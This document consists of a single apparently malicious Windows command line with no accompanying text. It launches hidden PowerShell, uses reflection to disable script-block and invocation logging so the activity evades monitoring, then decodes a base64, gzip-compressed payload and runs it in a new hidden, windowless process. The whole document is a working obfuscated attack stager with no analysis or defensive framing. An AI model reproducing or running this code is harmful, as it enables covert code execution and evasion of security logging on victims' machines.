C:\Windows\SysWOW64\cmd.exe /c powershell.exe -nop -w hidden -noni -c " if ([System.IntPtr]::Size -eq 4) {     $psPath = Join-Path $env:windir 'sysnative\WindowsPowerShell\v1.0\powershell.exe' } else {     $psPath = 'powershell.exe' } $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo $processStartInfo.FileName = $psPath $processStartInfo.Arguments = '-noni -nop -w hidden -c ' $logKey = 'Sc' + 'riptB' + 'lockLogging' if ($PSVersionTable.PSVersion.Major -ge 3) {     $enableLogging = 'EnableScriptBlockLogging'     $props = [Collections.Generic.Dictionary[string,System.Object]]::new()     $invocLog = 'EnableScriptBlockInvocationLogging'     $type1 = [Ref].Assembly.GetType('System.Management.Automation.Utils')     $type2 = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')     if ($type2) {         $field = $type2.GetField('hasLogged', 'NonPublic,Static')         if ($field) {             $field.SetValue($null, $true)         }     }     $groupPolicySettings = $type1.GetField('cachedGroupPolicySettings', 'NonPublic,Static')     if ($groupPolicySettings) {         $policies = $groupPolicySettings.GetValue($null)         if ($policies[$logKey]) {             $policies[$logKey][$enableLogging] = 0             $policies[$logKey][$invocLog] = 0         }         $props.Add($invocLog, 0)         $props.Add($enableLogging, 0)         $policies['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\' + $logKey] = $props     } } else {     $legacyType = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')     $legacyField = $legacyType.GetField('signatures', 'NonPublic,Static')     $legacyField.SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]')) } $decodedScript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('H4sIADfXPGUA/2WRQWvjMBCF7/oVg8mhPchJaU+BHkoct4FmE7qEXgxFkca1Wtky0ihL2Oa/R3ZNaugcjBnmfe/NaOJtcBIz7VCSdUe4h2QxL3YenS+EqnVTPLRtJkgUz1YKU6y1dNbbkopNg5nTBywSNglOd8qKqPXz6TSiQmtUOpvN/uG+sp5E26bS1tN3dSdub4TyCTBWhkaStg3sWmOF4rk2eDUp43crqLqG/wxiUUz1/dfVqjnYT+Qv6GmNVFkFfBfN+wR86GyjIfBV0/HgwouDHjMsRTC0cKiwIS2Mv5BfnSbkT502+RukRO/LYMwR4ioxHar5DyvpVSeQgmQ1Sjdm5CIOKyA7AEbyFJbOWRc7bwOJnRh7ROKLShu1IqyB95l/vU9/JIj7y+A8whfk1i2FrPhm/xFHhiyjg0aPNI97/BE1stMZie2Zm/ABAAA=')) $scriptBlock = [scriptblock]::create($decodedScript) $processStartInfo.Arguments += $scriptBlock.ToString() Write-Output $processStartInfo $processStartInfo.UseShellExecute = $false $processStartInfo.RedirectStandardOutput = $true $processStartInfo.WindowStyle = 'Hidden' $processStartInfo.CreateNoWindow = $true $process = [System.Diagnostics.Process]::Start($processStartInfo) " 
